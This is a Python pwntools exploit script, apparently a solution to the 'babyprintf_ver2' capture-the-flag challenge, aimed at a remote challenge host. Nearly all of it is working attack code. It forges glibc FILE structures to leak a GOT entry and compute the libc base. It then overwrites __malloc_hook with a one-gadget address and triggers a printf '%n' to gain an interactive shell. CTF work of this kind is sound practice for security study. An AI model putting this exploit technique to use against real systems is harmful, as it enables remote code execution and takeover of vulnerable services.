from pwn import *

DEBUG = 1
if DEBUG:
     p = process('./babyprintf_ver2')
     e = ELF('./babyprintf_ver2')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('./libc64.so')
     
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))


def pwn():
    #debug(0x921)
    p.recvuntil('location to ')
    addr=int(p.recvuntil('\n')[:-1],16)
    print hex(addr)
    pro_base=addr-0x202010
    print "pro base",hex(pro_base)
    
    addr=pro_base+0x202010+0x100
    write_got=e.got['write']+pro_base
    print "write got",hex(write_got)
    flag=0xfbad2887
    flag&=~8
    flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(0)                    #_IO_read_ptr
    fake_file+=p64(write_got)               #_IO_read_end
    fake_file+=p64(0)                    #_IO_read_base
    fake_file+=p64(write_got)               #_IO_write_base
    fake_file+=p64(write_got+8)             #_IO_write_ptr
    fake_file+=p64(0)             #_IO_write_end
    fake_file+=p64(0)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)            
    fake_file+=p64(addr)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(addr)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2

    fake_file_addr=pro_base+0x202010+0x10+8
    data='a'*0x10+p64(fake_file_addr)+fake_file
    p.sendline(data)
    p.recvuntil('ed!\n')
    write_addr=u64(p.recv(8))
    print hex(write_addr)
    libc_base=write_addr-libc.symbols['write']
    system_addr=libc_base+libc.symbols['system']
    
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    addr=pro_base+0x202010+0x100
    #write_got=e.got['write']+pro_base
    flag=0xfbad2887
    #flag&=~4
    #flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(0)             #_IO_read_ptr
    fake_file+=p64(0)             #_IO_read_end
    fake_file+=p64(0)             #_IO_read_base
    fake_file+=p64(0)             #_IO_write_base
    fake_file+=p64(malloc_hook)             #_IO_write_ptr
    fake_file+=p64(malloc_hook+0x8)         #_IO_write_end
    fake_file+=p64(0)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)            
    fake_file+=p64(addr)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(addr)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2
    #debug(0x921)
    rce=libc_base+0x4526a
    data=p64(rce)*2+p64(fake_file_addr)+fake_file
    p.sendline(data)
    p.sendline("%n")
    p.interactive()

if __name__ == '__main__':
   pwn()

